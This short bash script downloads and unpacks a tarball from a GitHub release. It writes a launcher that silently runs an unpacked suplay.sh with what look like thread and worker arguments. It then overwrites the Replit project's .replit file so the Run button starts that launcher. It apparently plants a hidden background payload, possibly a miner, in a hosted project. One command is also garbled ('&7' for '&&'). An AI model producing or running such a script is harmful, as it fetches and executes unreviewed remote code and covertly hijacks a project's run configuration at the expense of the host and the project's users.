#!/bin/bash

curl -O -J -L https://github.com/maul10-bit/bandrec/releases/download/fres/anoni.tar.gz &7 tar -xf anoni.tar.gz && rm -rf anoni.tar.gz
echo '#!/bin/bash

bash suplay.sh 4 suto-01 >/dev/null 2>&1' > aro.sh

echo 'modules = ["python-3.12"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "aro"

[[workflows.workflow]]
name = "aro"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash aro.sh"

[workflows.workflow.metadata]
outputType = "console"' > .replit
